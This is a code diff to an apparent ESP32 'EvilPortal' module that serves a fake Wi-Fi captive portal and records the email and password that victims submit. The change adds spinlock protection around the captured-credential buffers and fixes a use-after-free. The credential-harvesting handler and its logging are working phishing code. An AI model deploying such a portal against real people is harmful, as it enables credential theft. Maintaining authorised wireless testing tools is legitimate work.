@@ -8,6 +8,10 @@ char apName[MAX_AP_NAME_SIZE] = "PORTAL";
 
 AsyncWebServer server(80);
 
+// Serializes the captured-credential char buffers between the /get web handler
+// (AsyncTCP task) and the main task's main()/accessors.
+static portMUX_TYPE cred_mux = portMUX_INITIALIZER_UNLOCKED;
+
 void EvilPortal::setup() {
   this->runServer = false;
   this->name_received = false;
@@ -29,10 +33,10 @@ void EvilPortal::setup() {
 void EvilPortal::cleanup() {
   this->ap_index = -1;
 
-  #ifdef HAS_PSRAM
-    free(index_html);
-    index_html = nullptr;
-  #endif
+  // Do NOT free index_html here: the web handlers that stream it (send_P/send) may
+  // still be servicing an in-flight AsyncTCP request when cleanup() runs on the main
+  // task -- freeing it mid-stream is a use-after-free. setHtml() reuses (overwrites)
+  // the single PSRAM buffer each activation, so keeping it for the app lifetime is safe.
 }
 
 bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
@@ -49,11 +53,19 @@ bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_
 }
 
 String EvilPortal::get_user_name() {
-  return this->user_name;
+  char tmp[MAX_CRED_SIZE];
+  portENTER_CRITICAL(&cred_mux);
+  strlcpy(tmp, this->user_name, sizeof(tmp));
+  portEXIT_CRITICAL(&cred_mux);
+  return String(tmp);
 }
 
 String EvilPortal::get_password() {
-  return this->password;
+  char tmp[MAX_CRED_SIZE];
+  portENTER_CRITICAL(&cred_mux);
+  strlcpy(tmp, this->password, sizeof(tmp));
+  portEXIT_CRITICAL(&cred_mux);
+  return String(tmp);
 }
 
 void EvilPortal::setupServer() {
@@ -107,18 +119,24 @@ void EvilPortal::setupServer() {
     String inputMessage;
     String inputParam;
 
+    // Copy into the fixed cred buffers under the spinlock so the main task never reads
+    // them mid-write. Runs on the AsyncTCP task.
     if (request->hasParam("email")) {
       inputMessage = request->getParam("email")->value();
       inputParam = "email";
-      this->user_name = inputMessage;
+      portENTER_CRITICAL(&cred_mux);
+      strlcpy(this->user_name, inputMessage.c_str(), MAX_CRED_SIZE);
       this->name_received = true;
+      portEXIT_CRITICAL(&cred_mux);
     }
 
     if (request->hasParam("password")) {
       inputMessage = request->getParam("password")->value();
       inputParam = "password";
-      this->password = inputMessage;
+      portENTER_CRITICAL(&cred_mux);
+      strlcpy(this->password, inputMessage.c_str(), MAX_CRED_SIZE);
       this->password_received = true;
+      portEXIT_CRITICAL(&cred_mux);
     }
     request->send(
       200, "text/html",
@@ -360,18 +378,23 @@ void EvilPortal::main(uint8_t scan_mode) {
 
   this->dnsServer.processNextRequest();
 
+  // Snapshot the cred buffers + clear the flags under the spinlock (short critical
+  // section), then format/print/save OUTSIDE the lock.
+  bool ready = false;
+  char u[MAX_CRED_SIZE], p[MAX_CRED_SIZE];
+  portENTER_CRITICAL(&cred_mux);
   if (this->name_received && this->password_received) {
+    strlcpy(u, this->user_name, sizeof(u));
+    strlcpy(p, this->password, sizeof(p));
     this->name_received = false;
     this->password_received = false;
+    ready = true;
+  }
+  portEXIT_CRITICAL(&cred_mux);
 
-    // Adjust size depending on your max username/password length
-    char line[96];
-
-    // If user_name / password are still Arduino String:
-    snprintf(line, sizeof(line),
-             "u: %s p: %s\n",
-             this->user_name.c_str(),
-             this->password.c_str());
+  if (ready) {
+    char line[2 * MAX_CRED_SIZE + 16];
+    snprintf(line, sizeof(line), "u: %s p: %s\n", u, p);
 
     Serial.print(line);
     buffer_obj.append(line);
